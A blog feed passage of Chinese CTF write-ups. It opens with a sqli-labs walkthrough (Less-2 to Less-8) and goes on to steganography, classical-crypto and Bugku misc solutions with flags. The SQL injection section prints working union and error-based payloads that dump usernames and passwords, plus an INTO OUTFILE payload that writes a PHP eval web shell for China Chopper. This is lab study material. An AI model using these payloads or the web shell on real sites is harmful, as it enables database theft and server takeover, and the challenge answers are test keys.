src="http://img-blog.csdnimg.cn/20190728231327714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>   OKヾ(≧▽≦*)o 第一关到此结束。</p><p>   <strong>Less-2</strong></p><p>看一下源代码，发现没有任何防护，连单引号都没有，可以直接联合查询</p><pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190611172309372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   可以和第一题一样随便查了。<br>   <strong>Less-3</strong></p><p>1.输入?id=1’ –+ 页面报错<br><img src="http://img-blog.csdnimg.cn/20190611180106383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但输入?id=1’)  –+   页面是正常的<br><img src="http://img-blog.csdnimg.cn/20190611180950876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以可以判断出此题为字符串注入，以（’’)的方式闭合的。<br>OK 知道这些后 其余的步骤就同上了。</p><p><strong>less4</strong><br>这题的闭合方式为（” “）,多试几次就行了<br><img src="http://img-blog.csdnimg.cn/20190611182521357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其余同上。<br><strong>Less-5</strong> 双注入get单引号字符型注入<br>首先打开网页输入<code>?id=1</code><br><img src="http://img-blog.csdnimg.cn/20190611201540176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然而并没有显示用户名和密码，这是咋回事？查看一下源代码</p><pre><code>if($row)    &#123;      echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;;          echo &#39;You are in...........&#39;;      echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;/font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;        echo &#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;;        &#125;</code></pre><p>可以看到根本就没有输出 $row 这个查询结果。<br>根据题目此题为双注入，查看了一些大佬的文章之后终于明白了，<br>双查询注入顾名思义形式上是两个嵌套的查询，即select …(select …)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数：</p><p><strong>rand()随机函数，返回0~1之间的某个值<br>floor(a)取整函数，返回小于等于a，且值最接近a的一个整数<br>count()聚合函数也称作计数函数，返回查询对象的总数<br>group by cluase分组语句，按照cluase对查询结果分组</strong></p><p>详解请查看blog <a href="https://blog.csdn.net/Leep0rt/article/details/78556440">双注入详解</a>不懂的同学一定要看哦！</p><p>双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式。 那么开始构建sql语句：</p><pre><code>Less-5/?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+  //这里我们给查询的数据起了另一个名：a</code></pre><p>group by a字段，就是a字段有多少不同的值就有多少组，例如A字段有“a,b,b,c,c,c,d”，abcd各分一组，总共4组<br><img src="http://img-blog.csdnimg.cn/20190612193104255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>OK得到数据库了，然后就可以以同样地方式得到其他信息。</p><p><strong>获取表名：</strong></p><pre><code>?id=-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190612200651311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>查询用户信息：</strong></p><pre><code>?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+  </code></pre><p><img src="http://img-blog.csdnimg.cn/20190612200808485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第五关结束。<br><strong>Less-6</strong> 双注入GET双引号字符型注入<br>额 这题就是把上题的单引号变成了双引号。看看上面那题就好。</p><p><strong>Less-7</strong> 导出文件GET字符型注<br>打开页面输入<code>?id=1</code><img src="http://img-blog.csdnimg.cn/2019072118404036.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>试了很多发现报错信息都一样，查看下源代码：</p><pre><code>if($row)    &#123;      echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;          echo &#39;You are in.... Use outfile......&#39;;      echo &quot;&lt;br&gt;&quot;;      echo &quot;&lt;/font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    echo &#39;You have an error in your SQL syntax&#39;;</code></pre><p>发现 他把报错做了处理统一返回“You have an error in your SQL syntax”，同时他也给出了提示：<br>use outfile 也就是说需要使用outfile函数：<br>outfile函数就是将数据库的查询内容导出到一个外部文件<br>这时候就可以用菜刀了。</p><p>构造语句 写入<strong>一句话木马</strong> 就可以和菜刀连接了（ps：这里必须要写入根目录，不然菜刀没权限）<br><code>?id=-1&#39;))  union select 1,&quot;&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;&quot;,3 into outfile &quot;C:\\phpStudy\\WWW\\123.php&quot; --+</code><br><img src="http://img-blog.csdnimg.cn/2019072822315399.png" alt="在这里插入图片描述"><br>可以看到文件已将写入目录下了，<strong>如果有无法写入的小伙伴可以私信我哦，或者在下面评论</strong>✪ ω ✪<br>打开菜刀，右键添加<code>http://127.0.0.1/123.php</code>地址填入你上传文件的地址，后面的小方框中填入你构造的密码，也就是<code>chopper</code><br><img src="http://img-blog.csdnimg.cn/20190728223632460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功，就可以直接访问数据库了，嘿嘿嘿。<br><img src="http://img-blog.csdnimg.cn/20190728223719425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>Level-8</strong> 布尔型单引号GET盲注)<br><img src="http://img-blog.csdnimg.cn/20190727231427549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目已经提示了，为单引号盲注，先测试下<br><img src="http://img-blog.csdnimg.cn/20190727232549864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加单引号报错，注释后回显正常，确实是单引号注入，而且没有报错回显。接着用菜刀吧，步骤和上题一样，这里给出语句：<br><code>?id=1&#39; union select 1,&quot;&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;&quot;,3 into outfile &quot;C:\\phpStudy\\WWW\\123.php&quot; --+</code> OK。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验吧--隐写术</title>
      <link href="2019/07/25/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E9%9A%90%E5%86%99%E6%9C%AF/"/>
      <url>2019/07/25/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E9%9A%90%E5%86%99%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>1、欢迎来到地狱<br>2、stegas 300</p><a id="more"></a><p>小白一枚，趁着暑假来刷刷题，顺便记录下(。・∀・)ノ<br><strong>1、欢迎来到地狱</strong><br>连环套哦。格式CTF{xxxx}。<br>解题链接： <a href="http://ctf5.shiyanbar.com/stega/hell/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E5%9C%B0%E7%8B%B1.zip">http://ctf5.shiyanbar.com/stega/hell/欢迎来到地狱.zip</a><br>这题所涉及内容很丰富， 差点圆寂在这😂，呼~ 下面我就详细记录下这题的解题过程。<br>点击链接，下载了一个压缩包，打开<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777709341928_201104351_H800.png" alt="在这里插入图片描述"><br>一张图片、一个加密文档、和一个压缩包；图片无法打开，拿去winhex分析下，<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777702242665_201104351_H800.png" alt="在这里插入图片描述"><br>图片是jpg格式的，jpg图片的文件头是:<code>FFD8FF</code>在winhex里面添加，保存然后就能打开了。<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777708025783_201104351_H800.png" alt="在这里插入图片描述">emm…文字看着是没啥信息，图片的详细信息也没啥东西，点击链接：<a href="https://pan.baidu.com/s/1i49Jhlj">https://pan.baidu.com/s/1i49Jhlj</a>  下载到一段音频<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777706049736_201104351_H800.png" alt="在这里插入图片描述"><br>听了一哈，emm…感觉像是是摩斯密码；声音文件可以直接打开，可以根据声音记录下密码，或者使用<strong>Audacity</strong>查看下<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777704360678_201104351_H800.png" alt="在这里插入图片描述"><br>根据这段音谱，长的为<code>-</code> 短的为<code>.</code><br>其密文为：<code>-.- . -.-- .-.. . - ..- ... --. --- </code>  解密得:<code>KEYLETUSGO</code><br>经过几次尝试，文档密码为：<code>letusgo</code> 打开文档<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777708702576_201104351_H800.png" alt="在这里插入图片描述"><br>一只张二哈的图片；根据经验，查看下文档有没有隐藏文字；在文件点击选项→显示→隐藏文字<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707527592_201104351_H800.png" alt="在这里插入图片描述"><br>果然发现了 image steganography （图片隐写术）字样，看来应该是这张图片内部是被写入了关键数据；这里百度了一下才知道要咋做，把这张二哈的图片传入这个工具：→<a href="http://www.atool9.com/steganography.php">链接</a><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777709179498_201104351_H800.png" alt="在这里插入图片描述"><br>得到密码为：<code>key&#123;you are in finally hell now&#125;</code><br>输入：<code>you are in finally hell now</code>打开文本文档和图片 ；<br>啊啊啊！后来才知道这两个加密文档是同一个key,气死我了，查了我好长时间⊙﹏⊙<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777709742014_201104351_H800.png" alt="在这里插入图片描述"><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777701855499_201104351_H800.jpg" alt="在这里插入图片描述"><br>查看了下图片详细信息，没啥东西 ，binwalk一波<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777704358939_201104351_H800.png" alt="在这里插入图片描述"><br>发现有个压缩包，分离出来后发现是加密的（不知道为啥我用binwalk分离出来的压缩包打不开，又用foremost分离出来的）<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777705971853_201104351_H800.png" alt="在这里插入图片描述"><br>打开又是一个加密文本，很明显，上面那串二进制应该就是线索了。拿去在线二进制转字符串得到：<code>ruokouling</code>（弱口令）<a href="http://www.txttool.com/wenben_binarystr.asp">工具链接</a><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707334653_201104351_H800.png" alt="在这里插入图片描述"><br>尝试提交一下密码，发现并不行，那就使用字典破解去吧，（弱口令属于字典的一种）这里我使用的是ARCHPR<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777703600307_201104351_H800.png" alt="在这里插入图片描述"><br>很容易的得到口令：<code>Password </code> 打开文档<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777701524626_201104351_H800.png" alt="在这里插入图片描述"><br>密文<code>VTJGc2RHVmtYMTlwRG9yWjJoVFArNXcwelNBOWJYaFZlekp5MnVtRlRTcDZQZE42elBLQ01BPT0=</code><br>啊，这题真的是神仙啊(￣_￣|||)   ；从文本中可以得到这段密文经过了凯撒、base64 、和rabbit加密<br>根据密文应该先进行base64解密；工具都是在线的，链接就不放了。<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777702279999_201104351_H800.png" alt="在这里插入图片描述"><br>解密结果：</p><pre><code>U2FsdGVkX19pDorZ2hTP+5w0zSA9bXhVezJy2umFTSp6PdN6zPKCMA==</code></pre><p>然后rabbit解密：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707141432_201104351_H800.png" alt="在这里插入图片描述"><br>密文：<code>fxbqrwrvnwmngrjxsrnsrnhx</code><br>最后凯撒解密：<a href="http://www.zjslove.com/3.decode/kaisa/index.html">工具链接</a><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777706919184_201104351_H800.png" alt="在这里插入图片描述"><br>显然第十次解密内容就是flag <code>woshinimendexiaojiejieyo</code>    呼~ 终于结束了(～￣▽￣)～<br><strong>2、stegas 300</strong><br>点击链接下载了一段音频，链接：<code>http://ctf5.shiyanbar.com/stega/siri_audio/siri_audio.zip </code> ；听了下没啥信息，在用Au打开：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707446311_201104351_H800.png" alt="在这里插入图片描述"><br>emm…因为是小白，还没做过这种题，翻了翻别人的blog 知道了这是<strong>曼彻斯特编码</strong><br><strong>编码规则</strong></p><blockquote><p>在曼彻斯特编码中，每一位的中间有一跳变，位中间的跳变既作时钟信号，又作数据信号；从高到低跳变表示“0”，从低到高跳变表示“1”。还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示“0”或“1”，有跳变为“0”，无跳变为“1”。<br>其中非常值得注意的是，在每一位的”中间”必有一跳变，根据此规则，可以得出曼彻斯特编码波形图的画法。例如：传输二进制信息0，若将0看作一位，我们以0为中心，在两边用虚线界定这一位的范围，然后在这一位的中间画出一个电平由高到低的跳变。后面的每一位以此类推即可画出整个波形图。</p></blockquote><p>我们可以根据这个信息来找出数据即<br>低开高跳为<code>0</code><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777703605428_201104351_H800.png" alt="在这里插入图片描述"><hr><br>高开低收为<code>1</code><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777709995020_201104351_H800.png" alt="在这里插入图片描述"><br>于是得出以下数据：</p><pre><code>011000100110000101101011011001000110111101110010</code></pre><p>先转字符串看看<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707309053_201104351_H800.png" alt="在这里插入图片描述"><br> 这里辛亏看了下别人的blog 提交的格式很坑，竟然要把bakdor MD5加密(￣_￣|||)  好吧；<code>flag&#123;e1b64df17443b51e3007fd3d5370dca1&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学（二）</title>
      <link href="2019/07/21/%E5%AF%86%E7%A0%81%E5%AD%A6%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2019/07/21/%E5%AF%86%E7%A0%81%E5%AD%A6%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>1、凯撒部长的奖励<br>2、告诉你个秘密(ISCCCTF)<br>3、变异凯撒<br>4、传统知识+古典密码</p><a id="more"></a><p><strong>1、凯撒部长的奖励</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971007962172_201104351_H800.png" alt="在这里插入图片描述"><br>密文：<code>MSW&#123;byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om&#125;</code><br>看着挺凶的题，拿去解个密竟然就出来了；这里使用的是Bugku的工具，不得不说，真的很好用，嘿嘿。<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971007264636_201104351_H800.png"><br>flag：<code>SYC&#123;here_Is_yOur_rEwArd_enjOy_It_Caesar_or_call_him_vIctOr_is_a_Excellent_man_if_you_want_to_get_his_informations_you_can_join_us&#125;</code><br><strong>2、告诉你个秘密(ISCCCTF)</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971001479119_201104351_H800.png" alt="在这里插入图片描述">密文：</p><pre><code>636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067</code></pre><p>先来理性分析一波</p><ol><li><p>查看给定的字符串中，字符只有A-F，并且字符串两两结合对应的十进制小于128（ASCII码范围为0–127）</p></li><li><p>将他们转化为ascii对应的字符<br><code>cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g</code></p></li><li><p>2中得到的字符串，像是经过了base64编码，进行解密得<br><code>r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</code></p></li><li><p>看到这以空格分组的字符串，也懵逼了，到底啥意思呢，低头对着键盘。<br>发现r5yg包着了t，以此类推得到tongyuan。（这是键盘加密）</p></li><li><p>小写无法提交，使用大写提交</p></li></ol><p>代码：</p><pre><code>#coding:utf-8import base64strs=&quot;636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067&quot;i = 0strs_len = len(strs)chs=[]while(i &lt; strs_len):    chs.append(chr(int(strs[i:i+2],16)))    i = i + 2print(&quot;&quot;.join(chs))print(base64.decodestring(&quot;&quot;.join(chs)))</code></pre><p><strong>3、变异凯撒</strong><br>加密密文：<code>afZ_r9VYfScOeO_UL^RWUc</code><br>由题目中得知，这个密文的加密与凯撒解密有关，那就先解下密；<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971001399059_201104351_H800.png" alt="在这里插入图片描述"><br>但是解密内容貌似并没有我们想要的；那来分析下他们的ASCII码吧<br>密文：<code>afZ_r9VYfScOeO_UL^RWUc</code>，看看能否与<code>ctf</code> 或者<code>flag</code> 对应上，</p><pre><code>a:97    f:102    Z:106     _:95`                                                                                                                           c:99    t:116    f:102     &#123;:123f:102   l:108    a:97      g:103</code></pre><p>可以发现规律a→f 移动了5  ； f→l移动了6， 后面依次移动了7、8。<br>知道了这些就可以写脚本了：</p><pre><code>#!/usr/bin/env python# coding:utf-8def b_kaisa(mstr):    j = 5    i = 0    lmstr = []    for i in range(len(mstr)):        m = ord(mstr[i])          # 将密文的第i个字母变为其ascii码值        m = m + j                 # ascii值+j        lmstr.append(m)           # 将递进后的ascii值存入列表lmstr[]        i = i+1        j = j+1    return lmstrif __name__ == &#39;__main__&#39;:    m_str = &#39;afZ_r9VYfScOeO_UL^RWUc&#39;    # 密文    lstr = []    lstr = b_kaisa(m_str)    print lstr</code></pre><p>运行结果：<img src="https://img-blog.csdnimg.cn/20190721140851536.png" alt="在这里插入图片描述"><br>然后将这些ASCII码转换为字符串就好了；<br><img src="https://img-blog.csdnimg.cn/20190721144855252.png" alt="在这里插入图片描述"></p><p>   <code> flag&#123;Caesar_variation&#125;</code></p><p><strong>4、传统知识+古典密码</strong><br>小明某一天收到一封密信，信中写了几个不同的年份<br>          辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。<br>          信的背面还写有“+甲子”，请解出这段密文。</p><p>key值：CTF{XXX}</p><p>额…这题感jio很有意思的亚子；这里的年份是天干地支纪年法，其中一个甲子是60年，百度下这些年份的，这里得到了一张应该有用的信息：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971006482468_201104351_H800.png" alt="在这里插入图片描述"><br>对应着这些年份：<br>  辛卯：28<br>  癸巳：30<br>  丙戌：23<br>  辛未：8<br>  庚辰：17<br>  癸酉：10<br>  己卯：16<br>  癸巳：30<br> 题干中说信的背面还写有“+甲子”，于是我们可以把每个数加上60即可<br>  88，90，83，68，77，70，76，90<br>  emmm…得到这些数字把它们转化成ascii码看看 </p><pre><code> XZSDMFLZ</code></pre><p>没有别的提示，只好去翻翻别人的blog ，才知道需要先栅栏解密，2位一栏，然后再凯撒解密。唉，我错了，这题挺无聊的￣へ￣<br>flag：<code>CTF&#123;SHUANGYU&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku杂项（二）</title>
      <link href="2019/07/18/Bugku%E6%9D%82%E9%A1%B9%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2019/07/18/Bugku%E6%9D%82%E9%A1%B9%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>1、又一张图片，还单纯吗<br>2、隐写2<br>3、细心的大象<br>4、爆照(08067CTF)</p><a id="more"></a><p><strong>1、又一张图片，还单纯吗</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589962073058_201104351_H1920.png" alt="在这里插入图片描述"><br>链接地址：<a href="http://123.206.87.240:8002/misc/2.jpg">http://123.206.87.240:8002/misc/2.jpg</a><br>打开一看是一张图<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963366997_201104351_H800.jpg" alt="在这里插入图片描述"><br>先查看一下图片详细信息，不能在吃了上次的亏；emm…没发现啥信息,直接用刚得到的神器binwalk一下(～￣▽￣)～<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963593089_201104351_H1920.png" alt="在这里插入图片描述"><br>哇哦<del>，竟然藏着这么多图片，唉，按顺序一个个分离吧；<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589961454236_201104351_H800.png" alt="在这里插入图片描述"><br>哦吼</del>第一张打开一看竟然就是flag吗，提交试试—对了，真好。<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589969713368_201104351_H800.png" alt="在这里插入图片描述"><br><strong>2、隐写2</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964857928_201104351_H800.png" alt="在这里插入图片描述"><br>打开是一张表情包：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589966810932_201104351_H800.jpg" alt="在这里插入图片描述"><br>B数，自在人心(●’◡’●)  先用winhex看看 ，额 在之最后面发现了可疑的信息(⊙_⊙)？<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589961327786_201104351_H800.png" alt="在这里插入图片描述"><br>尝试把后缀名改了，果然 打开后有一个压缩包和一张图片<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967894562_201104351_H800.png" alt="在这里插入图片描述"><br>打开提示：<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967797359_201104351_H800.jpg" alt="在这里插入图片描述"><br>这里提示信息已将很明显了， 国王是K ；女神是Q ；骑士是J   不知道的可以百度下；尝试输入KQJ解密，但是失败了，看看提示发现密码是三个数字， 没看清 大意了╰(￣ω￣ｏ)<br>既然只有三位数直接暴力破解好了；很快得到密码：<strong>871</strong> ；其实对照键盘也是可以猜出来的<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967169776_201104351_H800.png" alt="在这里插入图片描述"><br>打开是这样的一张图，emmm… 再次丢进winhex里面<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963700206_201104351_H800.jpg" alt="在这里插入图片描述"><br>在末尾发现了flag^o^/：<code>f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE=&#125;</code><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589961432233_201104351_W120.png" alt="在这里插入图片描述"><br>然而提交失败╯︿╰，观察发现 这个flag应该被base加密了，拿去base64解密后得到<br>flag：<code>fl@g&#123;y0u Are a h@cker!&#125;</code>，再次提交，成功。<br><strong>3、细心的大象</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964833676_201104351_H1920.png" alt="在这里插入图片描述"><br>打开是一张图片：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963096230_201104351_H800.jpg" alt="在这里插入图片描述"><br>先看下图片详细信息<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963395800_201104351_H800.png" alt="在这里插入图片描述"><br>额…看着应该是base64；拿去解下密：<code>MSDS456ASD123zz</code><br>不用说了，图片肯定隐藏着压缩包，直接用<strong>foremost</strong>分离出来<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963300232_201104351_H800.png" alt="在这里插入图片描述"><br>输入解出来密码，额，又是杂项（一）隐写的那题，下面的步骤就不写了(●’◡’●)<br><strong>4、爆照(08067CTF)</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964884809_201104351_H800.png" alt="在这里插入图片描述"><br>打开是一张妹子的照片：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967249183_201104351_H800.jpg" alt="在这里插入图片描述"><br>先看下图片详细信息，啥也没有，直接binwalk吧<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967647360_201104351_H800.png" alt="在这里插入图片描述"><br>哦吼~好多压缩包，直接用foremost分离吧，分离出一个压缩包，打开<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589965269995_201104351_H800.png" alt="在这里插入图片描述"><br>额 ＞︿＜ 没思路啊，直接拿去binwalk吧<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964923678_201104351_H800.png" alt="在这里插入图片描述"><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589966736129_201104351_H800.png" alt="在这里插入图片描述"><br>可以看到88/888/8888里有图片，8888里还有一个压缩包，全都提取出来。<br>88：<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964822191_201104351_H800.jpg" alt="在这里插入图片描述"><br>扫描二维码：bilibili<br>888：<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967020918_201104351_H800.jpg" alt="在这里插入图片描述"><br>没啥东西，查看下详细信息：果然有东西<code>c2lsaXNpbGk=</code><br>拿去base64解码：<code>silisili</code><br>8888：图片<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963015826_201104351_H800.jpg" alt="在这里插入图片描述"><br>没啥信息；<br>zip打开有张二维码：<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589962413249_201104351_H800.png" alt="在这里插入图片描述"><br>扫描得：panama<br>多番尝试提交得到flag{bilibili_silisili_panama}<br>不得不说，这题真狗！！！<br>好，日后继续更新ヾ(≧▽≦*)o</p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
